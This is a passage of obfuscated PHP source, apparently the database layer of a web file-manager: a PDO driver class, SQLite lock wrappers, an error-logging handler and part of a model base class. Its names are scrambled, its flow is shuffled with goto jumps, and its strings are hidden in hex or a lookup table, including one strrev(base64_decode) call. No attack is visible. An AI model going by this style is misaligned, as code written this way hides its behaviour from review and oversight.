C‡£ÔĞæİË: try { $this->linkID[$Cçƒà‹§Õ¯]->exec($e·™§ÁªÆ[858] . think_config($e·™§ÁªÆ[825])); } catch (Exception $cÅ†Âˆ‚) { } $this->connected = !0; if (1 != think_config($e·™§ÁªÆ[18])) { unset($this->config); } goto bĞå»ëÏ‘»; bĞå»ëÏ‘»: } return $this->linkID[$Cçƒà‹§Õ¯]; } public function free() { $this->PDOStatement = null; } public function query($a°”×ˆËê”, $dé›«Ò›Êí = array()) { goto A¶×Šôè™; A¶×Šôè™: $F«ÌÉ«Èìß =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f ˆÂ³¤¾; f ˆÂ³¤¾: $this->queryStr = $a°”×ˆËê”; if (!empty($dé›«Ò›Êí)) { $this->queryStr .= $F«ÌÉ«Èìß[859] . print_r($dé›«Ò›Êí, !0) . $F«ÌÉ«Èìß[860]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dŸøÖ³Æ¾; dŸøÖ³Æ¾: think_action_status($F«ÌÉ«Èìß[19], 1); think_status($F«ÌÉ«Èìß[20]); $this->PDOStatement = $this->_linkID->prepare($a°”×ˆËê”); goto eÙØÉ•„˜; A œºë´Û: if (!1 === $Cá×ÖÇ¬Á) { $this->error(); return !1; } else { return $this->getAll(); } goto dÙùª‹İíù; eÙØÉ•„˜: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Cá×ÖÇ¬Á = $this->PDOStatement->execute($dé›«Ò›Êí); $this->debug(); goto A œºë´Û; dÙùª‹İíù: } public function execute($Eä©ÇÏÍ–È, $AÅóÑ‰ŞÁ = array()) { goto eø…õˆ»Ç; DÖëÇ‘Ò‘í: $B…éË¯‰Ú = $this->PDOStatement->execute($AÅóÑ‰ŞÁ); $this->debug(); if (!1 === $B…éË¯‰Ú) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($A­ğçà¥Í || preg_match($B”¤ÂöæÑÛ[865], $Eä©ÇÏÍ–È)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A„›ØäÁŸ·; b©¹ñéíœñ: think_status($B”¤ÂöæÑÛ[20]); $this->PDOStatement = $this->_linkID->prepare($Eä©ÇÏÍ–È); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto DÖëÇ‘Ò‘í; eø…õˆ»Ç: $B”¤ÂöæÑÛ =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÊô®â•ƒô; bÊô®â•ƒô: $this->queryStr = $Eä©ÇÏÍ–È; if (!empty($AÅóÑ‰ŞÁ)) { $this->queryStr .= $B”¤ÂöæÑÛ[859] . print_r($AÅóÑ‰ŞÁ, !0) . $B”¤ÂöæÑÛ[860]; } $A­ğçà¥Í = !1; goto E“î¾„Ô­; E“î¾„Ô­: if ($this->dbType == $B”¤ÂöæÑÛ[853]) { if (preg_match($B”¤ÂöæÑÛ[861], $this->queryStr, $aö÷Àç¼‰)) { $this->table = think_config($B”¤ÂöæÑÛ[862]) . str_ireplace(think_config($B”¤ÂöæÑÛ[863]), $B”¤ÂöæÑÛ[361], $aö÷Àç¼‰[2]); $A­ğçà¥Í = (bool) $this->query($B”¤ÂöæÑÛ[864] . strtoupper($this->table) . $B”¤ÂöæÑÛ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($B”¤ÂöæÑÛ[21], 1); goto b©¹ñéíœñ; A„›ØäÁŸ·: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a¾˜‡åÂ½í = $this->_linkID->commit(); $this->transTimes = 0; if (!$a¾˜‡åÂ½í) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aæˆ‘å½Â = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aæˆ‘å½Â) { $this->error(); return !1; } } return !0; } private function getAll() { $DÆ¸”õÕÙ¥ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($DÆ¸”õÕÙ¥); return $DÆ¸”õÕÙ¥; } public function getFields($BßŒ¨Ì…) { goto bò›ï¨ÒÜì; bò›ï¨ÒÜì: $B¼ÇèÒ¿— =& $_SERVER[ã®Â„Éæ¹¤]; $this->initConnect(!0); if (think_config($B¼ÇèÒ¿—[866])) { $c›¥Û³Ë¥± = str_replace($B¼ÇèÒ¿—[867], $BßŒ¨Ì…, think_config($B¼ÇèÒ¿—[866])); } else { switch ($this->dbType) { case $B¼ÇèÒ¿—[850]: case $B¼ÇèÒ¿—[868]: $c›¥Û³Ë¥± = "\x53\105\x4c\x45\103\x54\40\40\40\x63\x6f\x6c\165\x6d\156\137\x6e\x61\155\x65\40\141\163\40\47\116\x61\x6d\x65\47\54\40\x20\x20\x64\x61\x74\x61\137\164\171\160\145\40\x61\163\x20\x27\124\171\x70\145\47\x2c\40\x20\x20\143\x6f\154\x75\155\156\137\x64\145\x66\x61\x75\x6c\x74\40\x61\163\x20\x27\104\145\x66\141\165\154\x74\x27\x2c\x20\40\40\151\163\x5f\x6e\165\x6c\154\x61\142\x6c\x65\x20\141\x73\40\47\116\165\x6c\154\47\12\11\x9\x46\122\x4f\x4d\x9\x69\x6e\146\157\x72\155\x61\164\x69\157\156\x5f\x73\143\150\145\x6d\141\x2e\x74\x61\x62\x6c\145\x73\40\x41\123\40\x74\12\11\11\112\117\111\x4e\11\x69\x6e\x66\157\162\x6d\141\164\x69\x6f\156\137\163\x63\150\x65\155\x61\x2e\143\x6f\154\165\155\156\163\40\101\x53\40\143\xa\x9\11\x4f\x4e\40\x20\x74\x2e\164\141\142\x6c\x65\137\143\141\x74\x61\x6c\x6f\147\x20\75\x20\x63\x2e\x74\x61\x62\154\x65\137\x63\x61\164\x61\154\157\147\12\11\11\x41\x4e\104\40\164\x2e\x74\x61\142\154\145\137\163\143\x68\x65\x6d\x61\40\x3d\40\143\x2e\x74\x61\142\x6c\x65\x5f\163\x63\150\x65\155\x61\12\11\11\101\x4e\x44\40\164\56\164\141\x62\x6c\145\x5f\156\141\155\145\x20\75\x20\143\56\164\141\x62\154\x65\137\156\141\x6d\145\xa\x9\x9\127\x48\105\122\x45\x20\40\40\x74\x2e\x74\x61\x62\x6c\145\x5f\x6e\141\155\x65\40\x3d\x20\47{$BßŒ¨Ì…}\x27"; break; case $B¼ÇèÒ¿—[869]: $c›¥Û³Ë¥± = $B¼ÇèÒ¿—[870] . $BßŒ¨Ì… . $B¼ÇèÒ¿—[871]; break; case $B¼ÇèÒ¿—[851]: case $B¼ÇèÒ¿—[853]: $c›¥Û³Ë¥± = $B¼ÇèÒ¿—[872] . $B¼ÇèÒ¿—[873] . $B¼ÇèÒ¿—[874] . strtoupper($BßŒ¨Ì…) . $B¼ÇèÒ¿—[875] . strtoupper($BßŒ¨Ì…) . $B¼ÇèÒ¿—[876]; break; case $B¼ÇèÒ¿—[877]: $c›¥Û³Ë¥± = $B¼ÇèÒ¿—[878] . $BßŒ¨Ì… . $B¼ÇèÒ¿—[879]; break; case $B¼ÇèÒ¿—[852]: break; case $B¼ÇèÒ¿—[880]: default: $c›¥Û³Ë¥± = $B¼ÇèÒ¿—[881] . ($this->dbType == $B¼ÇèÒ¿—[880] ? "\x60{$BßŒ¨Ì…}\x60" : $BßŒ¨Ì…); } } goto fŸßäšªä; F›Ú“©¬Ö: return $dÒŸÍ¯±; goto E…ÍŞ’ÃŞÓ; fŸßäšªä: $C¿Û•ÑŸ³ = $this->query($c›¥Û³Ë¥±); $dÒŸÍ¯± = array(); if ($C¿Û•ÑŸ³) { foreach ($C¿Û•ÑŸ³ as $d¹ĞíÜ’ï¶ => $c‹…íƒ»¼à) { $c‹…íƒ»¼à = array_change_key_case($c‹…íƒ»¼à); $c‹…íƒ»¼à[$B¼ÇèÒ¿—[28]] = isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[28]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[28]] : $B¼ÇèÒ¿—[361]; $c‹…íƒ»¼à[$B¼ÇèÒ¿—[29]] = isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[29]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[29]] : $B¼ÇèÒ¿—[361]; $cˆÎç‡‡î = isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[261]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[261]] : $c‹…íƒ»¼à[$B¼ÇèÒ¿—[28]]; $dÒŸÍ¯±[$cˆÎç‡‡î] = array($B¼ÇèÒ¿—[28] => $cˆÎç‡‡î, $B¼ÇèÒ¿—[29] => $c‹…íƒ»¼à[$B¼ÇèÒ¿—[29]], $B¼ÇèÒ¿—[31] => (bool) (isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[99]]) && $c‹…íƒ»¼à[$B¼ÇèÒ¿—[99]] === $B¼ÇèÒ¿—[33] || isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[31]]) && $c‹…íƒ»¼à[$B¼ÇèÒ¿—[31]] === $B¼ÇèÒ¿—[33]), $B¼ÇèÒ¿—[34] => isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[34]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[34]] : (isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[53]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[53]] : $B¼ÇèÒ¿—[361]), $B¼ÇèÒ¿—[36] => isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[89]]) ? strtolower($c‹…íƒ»¼à[$B¼ÇèÒ¿—[89]]) == $B¼ÇèÒ¿—[38] : (isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[54]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[54]] : !1), $B¼ÇèÒ¿—[39] => isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[882]]) ? strtolower($c‹…íƒ»¼à[$B¼ÇèÒ¿—[882]]) == $B¼ÇèÒ¿—[41] : (isset($c‹…íƒ»¼à[$B¼ÇèÒ¿—[89]]) ? $c‹…íƒ»¼à[$B¼ÇèÒ¿—[89]] : !1)); } } goto F›Ú“©¬Ö; E…ÍŞ’ÃŞÓ: } public function getTables($Fö°ãÊ”ƒÎ = '') { $AÖß¤ŠÜ =& $_SERVER[ã®Â„Éæ¹¤]; if (think_config($AÖß¤ŠÜ[883])) { $aË‡’Â°Š· = str_replace($AÖß¤ŠÜ[884], $Fö°ãÊ”ƒÎ, think_config($AÖß¤ŠÜ[883])); } else { switch ($this->dbType) { case $AÖß¤ŠÜ[851]: case $AÖß¤ŠÜ[853]: $aË‡’Â°Š· = $AÖß¤ŠÜ[885]; break; case $AÖß¤ŠÜ[850]: case $AÖß¤ŠÜ[868]: $aË‡’Â°Š· = $AÖß¤ŠÜ[886]; break; case $AÖß¤ŠÜ[877]: $aË‡’Â°Š· = $AÖß¤ŠÜ[887]; break; case $AÖß¤ŠÜ[852]: think_exception(think_lang($AÖß¤ŠÜ[888]) . $AÖß¤ŠÜ[889]); break; case $AÖß¤ŠÜ[869]: $aË‡’Â°Š· = $AÖß¤ŠÜ[42] . $AÖß¤ŠÜ[43] . $AÖß¤ŠÜ[44]; break; case $AÖß¤ŠÜ[880]: default: if (!empty($Fö°ãÊ”ƒÎ)) { $aË‡’Â°Š· = $AÖß¤ŠÜ[833] . $Fö°ãÊ”ƒÎ; } else { $aË‡’Â°Š· = $AÖß¤ŠÜ[834]; } } } $b¬˜ø°³¶ = $this->query($aË‡’Â°Š·); $b¡ôß¦«¶Â = array(); foreach ($b¬˜ø°³¶ as $C×çˆÈæ… => $Eºî·Üš) { $b¡ôß¦«¶Â[$C×çˆÈæ…] = current($Eºî·Üš); } return $b¡ôß¦«¶Â; } protected function parseLimit($c¾ã…Æµ›İ) { $eéâ–Ã“î‡ =& $_SERVER[ã®Â„Éæ¹¤]; $Eğê³ Ğ„ø = $eéâ–Ã“î‡[33]; if (!empty($c¾ã…Æµ›İ)) { switch ($this->dbType) { case $eéâ–Ã“î‡[877]: case $eéâ–Ã“î‡[869]: $c¾ã…Æµ›İ = explode($eéâ–Ã“î‡[47], $c¾ã…Æµ›İ); if (count($c¾ã…Æµ›İ) > 1) { $Eğê³ Ğ„ø .= $eéâ–Ã“î‡[48] . $c¾ã…Æµ›İ[1] . $eéâ–Ã“î‡[49] . $c¾ã…Æµ›İ[0] . $eéâ–Ã“î‡[50]; } else { $Eğê³ Ğ„ø .= $eéâ–Ã“î‡[48] . $c¾ã…Æµ›İ[0] . $eéâ–Ã“î‡[50]; } break; case $eéâ–Ã“î‡[850]: case $eéâ–Ã“î‡[868]: break; case $eéâ–Ã“î‡[852]: break; case $eéâ–Ã“î‡[851]: case $eéâ–Ã“î‡[853]: break; case $eéâ–Ã“î‡[880]: default: $Eğê³ Ğ„ø .= $eéâ–Ã“î‡[48] . $c¾ã…Æµ›İ . $eéâ–Ã“î‡[50]; } } return $Eğê³ Ğ„ø; } public function parseKey(&$eÓÃÄÓå«, $B¥Î¯¸¹ = true) { $Dƒ… ğ×‘Œ =& $_SERVER[ã®Â„Éæ¹¤]; if ($B¥Î¯¸¹) { $eÓÃÄÓå« = $this->parseKeyCheck($eÓÃÄÓå«); } if ($this->dbType == $Dƒ… ğ×‘Œ[880]) { if ($eÓÃÄÓå« != $Dƒ… ğ×‘Œ[176] && !preg_match($Dƒ… ğ×‘Œ[844], $eÓÃÄÓå«)) { $eÓÃÄÓå« = $Dƒ… ğ×‘Œ[845] . trim($eÓÃÄÓå«, $Dƒ… ğ×‘Œ[845]) . $Dƒ… ğ×‘Œ[845]; } return $eÓÃÄÓå«; } else { return parent::parseKey($eÓÃÄÓå«); } } public function close() { $this->_linkID = null; } public function error() { $aìøğ‰Øñî =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->PDOStatement) { $DÊá»ÉÇá = $this->PDOStatement->errorInfo(); $this->error = $DÊá»ÉÇá[1] . $aìøğ‰Øñî[4] . $DÊá»ÉÇá[2]; } else { $this->error = $aìøğ‰Øñî[33]; } if ($aìøğ‰Øñî[33] != $this->queryStr) { $this->error .= LNG($aìøğ‰Øñî[45]) . $this->queryStr; } think_trace($this->error, $aìøğ‰Øñî[33], $aìøğ‰Øñî[46]); return $this->error; } public function escapeString($b–¯Ÿ®‘‡Ò) { $dÕè‹–‘Şí =& $_SERVER[ã®Â„Éæ¹¤]; switch ($this->dbType) { case $dÕè‹–‘Şí[877]: case $dÕè‹–‘Şí[850]: case $dÕè‹–‘Şí[868]: case $dÕè‹–‘Şí[880]: return addslashes($b–¯Ÿ®‘‡Ò); case $dÕè‹–‘Şí[852]: case $dÕè‹–‘Şí[869]: case $dÕè‹–‘Şí[851]: case $dÕè‹–‘Şí[853]: return str_ireplace($dÕè‹–‘Şí[55], $dÕè‹–‘Şí[56], $b–¯Ÿ®‘‡Ò); } } protected function parseValue($eÕ‹¬Ò‹¬ø) { $dšŒºùŞ±´ =& $_SERVER[ã®Â„Éæ¹¤]; if (is_string($eÕ‹¬Ò‹¬ø)) { $eÕ‹¬Ò‹¬ø = strpos($eÕ‹¬Ò‹¬ø, $dšŒºùŞ±´[4]) === 0 ? $this->escapeString($eÕ‹¬Ò‹¬ø) : $dšŒºùŞ±´[890] . $this->escapeString($eÕ‹¬Ò‹¬ø) . $dšŒºùŞ±´[890]; } elseif (isset($eÕ‹¬Ò‹¬ø[0]) && is_string($eÕ‹¬Ò‹¬ø[0]) && strtolower($eÕ‹¬Ò‹¬ø[0]) == $dšŒºùŞ±´[285]) { $eÕ‹¬Ò‹¬ø = $this->escapeString($eÕ‹¬Ò‹¬ø[1]); } elseif (is_array($eÕ‹¬Ò‹¬ø)) { $eÕ‹¬Ò‹¬ø = array_map(array($this, $dšŒºùŞ±´[891]), $eÕ‹¬Ò‹¬ø); } elseif (is_bool($eÕ‹¬Ò‹¬ø)) { $eÕ‹¬Ò‹¬ø = $eÕ‹¬Ò‹¬ø ? $dšŒºùŞ±´[83] : $dšŒºùŞ±´[470]; } elseif (is_null($eÕ‹¬Ò‹¬ø)) { $eÕ‹¬Ò‹¬ø = $dšŒºùŞ±´[99]; } return $eÕ‹¬Ò‹¬ø; } public function getLastInsertId() { $dÅîá„œÑ =& $_SERVER[ã®Â„Éæ¹¤]; switch ($this->dbType) { case $dÅîá„œÑ[877]: case $dÅîá„œÑ[869]: case $dÅîá„œÑ[850]: case $dÅîá„œÑ[868]: case $dÅîá„œÑ[852]: case $dÅîá„œÑ[880]: return $this->_linkID->lastInsertId(); case $dÅîá„œÑ[851]: case $dÅîá„œÑ[853]: $DªÄ‡“‡Á¹ = $this->table; $FÉÁ‡ÊëÎÏ = $this->query("\123\x45\114\105\x43\124\x20{$DªÄ‡“‡Á¹}\56\143\165\x72\162\166\141\154\40\143\x75\x72\162\x76\141\154\40\x46\122\x4f\115\40\144\x75\141\154"); return $FÉÁ‡ÊëÎÏ ? $FÉÁ‡ÊëÎÏ[0][$dÅîá„œÑ[892]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($f ¸‡†ñÍ¬) { $eæÆõ­õ =& $_SERVER[ã®Â„Éæ¹¤]; if (!CacheLock::fileLock($eæÆõ­õ[9])) { return !1; } $DßÀ¤¦é– = parent::query($f ¸‡†ñÍ¬); CacheLock::fileUnLock($eæÆõ­õ[9]); return $DßÀ¤¦é–; } public function execute($eå°ä¨ÀÖ†) { $aÚ•…«ìğŒ =& $_SERVER[ã®Â„Éæ¹¤]; if (!CacheLock::fileLock($aÚ•…«ìğŒ[9])) { return !1; } $a†ñÎ£öİ = parent::execute($eå°ä¨ÀÖ†); CacheLock::fileUnLock($aÚ•…«ìğŒ[9]); return $a†ñÎ£öİ; } } class DbSqlite3 extends DbSqlite3Base { public function query($e”åìÁ¦è“) { $C»ùçº”„ =& $_SERVER[ã®Â„Éæ¹¤]; if (!CacheLock::fileLock($C»ùçº”„[9])) { return !1; } $C§Üé¢ßĞ™ = parent::query($e”åìÁ¦è“); CacheLock::fileUnLock($C»ùçº”„[9]); return $C§Üé¢ßĞ™; } public function execute($E¿‘š¢â‡) { $C‚’ààù˜Ÿ =& $_SERVER[ã®Â„Éæ¹¤]; if (!CacheLock::fileLock($C‚’ààù˜Ÿ[9])) { return !1; } $f´ëè´ÜÒ¬ = parent::execute($E¿‘š¢â‡); CacheLock::fileUnLock($C‚’ààù˜Ÿ[9]); return $f´ëè´ÜÒ¬; } } goto B¥Ã¯Ğ¡è; Dñ‘ØÊ½¾º: function beforeShutdownError($FŞÉŒ¸øê† = false, $A¥‡ƒ’»›‰ = '', $eÌãÈãÄÇá = '', $dÍĞ…òœ¬Ò = 0) { $a‘«Õ¢ÛÅ =& $_SERVER[ˆó©™¯í›]; switch ($FŞÉŒ¸øê†) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $E±‚˜’î†ô = $a‘«Õ¢ÛÅ[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $E±‚˜’î†ô = $a‘«Õ¢ÛÅ[36]; break; case E_STRICT: $E±‚˜’î†ô = $a‘«Õ¢ÛÅ[37]; break; case E_NOTICE: case E_USER_NOTICE: $E±‚˜’î†ô = $a‘«Õ¢ÛÅ[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $E±‚˜’î†ô = $a‘«Õ¢ÛÅ[39]; break; default: break; } if (!$E±‚˜’î†ô || $E±‚˜’î†ô == $a‘«Õ¢ÛÅ[38] || $E±‚˜’î†ô == $a‘«Õ¢ÛÅ[39]) { return; } $eÌãÈãÄÇá = $a‘«Õ¢ÛÅ[4] . str_replace($_SERVER[$a‘«Õ¢ÛÅ[33]], $a‘«Õ¢ÛÅ[16], $eÌãÈãÄÇá); $cäœ½ÇëÌæ = $E±‚˜’î†ô . $a‘«Õ¢ÛÅ[40] . $A¥‡ƒ’»›‰ . $a‘«Õ¢ÛÅ[40] . $eÌãÈãÄÇá . $a‘«Õ¢ÛÅ[40] . $dÍĞ…òœ¬Ò; write_log($cäœ½ÇëÌæ . $a‘«Õ¢ÛÅ[41] . get_caller_msg(1), $a‘«Õ¢ÛÅ[15]); } $_SERVER[$_SERVER[ˆó©™¯í›][42]] = $_SERVER[$_SERVER[ˆó©™¯í›][33]] . $_SERVER[ˆó©™¯í›][43]; $AÃ˜ùÔÚƒö = strrev(base64_decode($_SERVER[ˆó©™¯í›][44])); goto cÃéÉšíÁ©; bïœ‚æÛ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\x79\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\156\163\145\x72\x74\54\x75\160\144\141\x74\x65", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\x63\x72\x65\141\164\145\x54\151\x6d\145", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\x66\165\156\x63\x74\151\157\156")); public function setDataAuto($F«Šàœ©«¢) { $this->dataAuto = $F«Šàœ©«¢; } public function __construct($D¹ê‘Á° = '', $e¥’ëŠÌ…œ = '', $A…ĞÛ´ˆ² = '') { parent::__construct($D¹ê‘Á°, $e¥’ëŠÌ…œ, $A…ĞÛ´ˆ²); } public static function textEncode($fèÒ²¢Š ‰) { if (!$fèÒ²¢Š ‰) { return $fèÒ²¢Š ‰; } $f©¡×šª¸ = json_encode($fèÒ²¢Š ‰); $f©¡×šª¸ = preg_replace_callback($_SERVER[ã®Â„Éæ¹¤][342], function ($aî‚ÇÀ¶‚) { return addslashes($aî‚ÇÀ¶‚[0]); }, $f©¡×šª¸); return json_decode($f©¡×šª¸); } public static function textDecode($BÜØÙ¦·¾¥) { $d‘˜àõ¯åè =& $_SERVER[ã®Â„Éæ¹¤]; $aÓê×¿äîÇ = json_encode($BÜØÙ¦·¾¥); $aÓê×¿äîÇ = preg_replace_callback($d‘˜àõ¯åè[343], function ($fÇËÛ®İâ–) { return $_SERVER[ã®Â„Éæ¹¤][93]; }, $aÓê×¿äîÇ); return json_decode($aÓê×¿äîÇ); } protected $tableMeta = array(); protected function _beforeInsert(&$A¦éŒÚÑŠ, $aÜ¨êË­) { $B‰©éÊ¢ˆó =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->checkDataAutoHas($B‰©éÊ¢ˆó[344])) { return; } $this->dataBeforeFilter($A¦éŒÚÑŠ, $B‰©éÊ¢ˆó[344]); } protected function _beforeUpdate(&$fŠÍ°÷ï, $aÚ™‚¦‰Ä) { $Eé¬½ó²¤ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->checkDataAutoHas($Eé¬½ó²¤[345])) { return; } $this->dataBeforeFilter($fŠÍ°÷ï, $Eé¬½ó²¤[345]); } protected function _afterSelect(&$B¼¯ÁÃ¥¡ì, $fÎ†‰Ş¡œ) { if (!is_array($B¼¯ÁÃ¥¡ì)) { return; } if (!$this->checkDataAutoHas($_SERVER[ã®Â„Éæ¹¤][346])) { return; } foreach ($B¼¯ÁÃ¥¡ì as &$b™é·©É¯À) { $this->dataAfterFilter($b™é·©É¯À); } unset($b™é·©É¯À); } protected function _afterFind(&$eŞ‰Ùùõ¼¦, $Dª‚Ë³êø„) { if (!is_array($eŞ‰Ùùõ¼¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[ã®Â„Éæ¹¤][346])) { return; } $this->dataAfterFilter($eŞ‰Ùùõ¼¦); } public function setAutoIncrement($B®’Î½ßõÑ) { $aºÌ‡ÒµÌ“ = array($this->getPk() => $B®’Î½ßõÑ); $e¼ îíèË¸ = $this->data($aºÌ‡ÒµÌ“)->add(); if ($e¼ îíèË¸) { $this->delete($e¼ îíèË¸); } } public function getAutoIncrement() { $C¢ÛŸ™ğƒç = $this->getTableName(); $a…ßÔÚ›« = $this->max($this->getPk()); $bºÒ¥ ñªç = $this->query("\x73\150\157\x77\40\164\141\142\x6c\x65\x20\x73\164\141\x74\165\163\x20\167\x68\145\x72\145\x20\x4e\x61\155\x65\75\x27{$C¢ÛŸ™ğƒç}\47"); $CŞÈ‚éÓ = $bºÒ¥ ñªç[0][$_SERVER[ã®Â„Éæ¹¤][347]]; $cŠ³àÑ·Û´ = max($a…ßÔÚ›«, $CŞÈ‚éÓ); return $cŠ³àÑ·Û´; } protected function _callBefore($fê…Îñ˜Ÿ†, $f¼™Ú‡åí) { return $this->cacheCallCheck($fê…Îñ˜Ÿ†, $f¼™Ú‡åí, !1); } protected function _callAfter($d „¼¦µÍ“, $cóšºĞš™) { return $this->cacheCallCheck($d „¼¦µÍ“, $cóšºĞš™, !0); } protected function cacheFunctionAlias($B‹ãöİ‹İ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F½ƒÓĞÔ”ä, $f÷ƒàä—–Ï, $e†Ê—É¾šÃ = false) { $c™’…‚Ø‰ô = $this->cacheFunctionAlias($f÷ƒàä—–Ï); if (!$c™’…‚Ø‰ô) { return; } foreach ($c™’…‚Ø‰ô as $C‰íãÁ‡„à => $a–ëÊ±“¸) { $b¶¥Á›ß’ = $a–ëÊ±“¸[0]; $f²ë‡ç…¾‘ = explode($_SERVER[ã®Â„Éæ¹¤][47], $a–ëÊ±“¸[1]); if ($F½ƒÓĞÔ”ä == $C‰íãÁ‡„à) { return $this->cacheFunctionGet($C‰íãÁ‡„à, $b¶¥Á›ß’); } if ($e†Ê—É¾šÃ && in_array($F½ƒÓĞÔ”ä, $f²ë‡ç…¾‘)) { $this->cacheFunctionClear($C‰íãÁ‡„à, $b¶¥Á›ß’); } } } public function cacheFunctionGet($eÃ’ĞŠ‡á­, $aßï•ŒùÊ©) { $AƒïáóÆ¬ß = $this->cacheKeyMake($eÃ’ĞŠ‡á­, $aßï•ŒùÊ©); $aÔ´ÖÍĞî‚ = Cache::get($AƒïáóÆ¬ß); if (!is_array($aÔ´ÖÍĞî‚)) { $aÔ´ÖÍĞî‚ = call_user_func_array(array($this, $eÃ’ĞŠ‡á­), array($aßï•ŒùÊ©, !0)); Cache::set($AƒïáóÆ¬ß, $aÔ´ÖÍĞî‚); } return $aÔ´ÖÍĞî‚; } public function cacheFunctionClear($aƒ¦¡«òÉ¼, $fßãÊ±“³‡) { $eù˜¾µÈ» = $fßãÊ±“³‡; if (!is_array($fßãÊ±“³‡)) { $eù˜¾µÈ» = array($fßãÊ±“³‡); } foreach ($eù˜¾µÈ» as $B±Éê¿ùíò) { $EÁÀëˆô« = $this->cacheKeyMake($aƒ¦¡«òÉ¼, $B±Éê¿ùíò); Cache::remove($EÁÀëˆô«); } } private function cacheKeyMake($b¦ ´õòİ˜, $B‚îÂéğÔ·) { $e¼¢Ò‚œ™Ô =& $_SERVER[ã®Â„Éæ¹¤]; return get_class($this) . $e¼¢Ò‚œ™Ô[70] . $b¦ ´õòİ˜ . $e¼¢Ò‚œ™Ô[348] . $B‚îÂéğÔ·; } protected function selectPage($FñåÖ‚æ = 200, $B”ÁÂÖÒ«ò = 1) { goto cÛøœŠÊ‘; aŠÙ¹šĞ: $a¶ì¼ø³” = 4000; $FñåÖ‚æ = isset($in[$eÈ°Ûéµò†[349]]) ? $in[$eÈ°Ûéµò†[349]] : $FñåÖ‚æ; if ($FñåÖ‚æ === -1) { unset($in[$eÈ°Ûéµò†[349]]); $a¶ì¼ø³” = 100000000; $FñåÖ‚æ = $a¶ì¼ø³”; } goto E‰’†³”É; E‰’†³”É: $A›ˆïÑ«Ñ° = $B†³“”Çœ¯; $A›ˆïÑ«Ñ°[$eÈ°Ûéµò†[350]] = array(); $this->optionsValue($A›ˆïÑ«Ñ°); goto fñğ›Õìğº; Eì±…‘‹åÀ: $this->optionsValue($B†³“”Çœ¯); $dÏÃò‚É‡ = $this->page($B”ÁÂÖÒ«ò, $FñåÖ‚æ)->select(); $dÏÃò‚É‡ = is_array($dÏÃò‚É‡) ? $dÏÃò‚É‡ : array(); goto EæÚØ‹¬™Ì; EæÚØ‹¬™Ì: if ($Eª°âòïÍš == 1) { $b¾ÇËÆ» = count($dÏÃò‚É‡); } $Dà‚ Áöç£ = array($eÈ°Ûéµò†[351] => array($eÈ°Ûéµò†[352] => $b¾ÇËÆ», $eÈ°Ûéµò†[349] => $FñåÖ‚æ, $eÈ°Ûéµò†[340] => $B”ÁÂÖÒ«ò, $eÈ°Ûéµò†[353] => $Eª°âòïÍš), $eÈ°Ûéµò†[354] => $dÏÃò‚É‡ ? $dÏÃò‚É‡ : array()); return $Dà‚ Áöç£; goto Có–öê×¾Ú; cÛ²ê¥áÔ: $Eª°âòïÍš = ceil($b¾ÇËÆ» / $FñåÖ‚æ); $B”ÁÂÖÒ«ò = intval(isset($in[$eÈ°Ûéµò†[340]]) ? $in[$eÈ°Ûéµò†[340]] : $B”ÁÂÖÒ«ò); $B”ÁÂÖÒ«ò = $B”ÁÂÖÒ«ò <= 1 ? 1 : ($B”ÁÂÖÒ«ò >= $Eª°âòïÍš ? $Eª°âòïÍš : $B”ÁÂÖÒ«ò); goto Eì±…‘‹åÀ; cÛøœŠÊ‘: $eÈ°Ûéµò† =& $_SERVER[ã®Â„Éæ¹¤]; global $in; $B†³“”Çœ¯ = $this->optionsValue(); goto aŠÙ¹šĞ; fñğ›Õìğº: $b¾ÇËÆ» = intval($this->count()); $FñåÖ‚æ = intval($FñåÖ‚æ); $FñåÖ‚æ = $FñåÖ‚æ <= 5 ? 5 : ($FñåÖ‚æ >= $a¶ì¼ø³” ? $a¶ì¼ø³” : $FñåÖ‚æ); goto cÛ²ê¥áÔ; Có–öê×¾Ú: } protected function 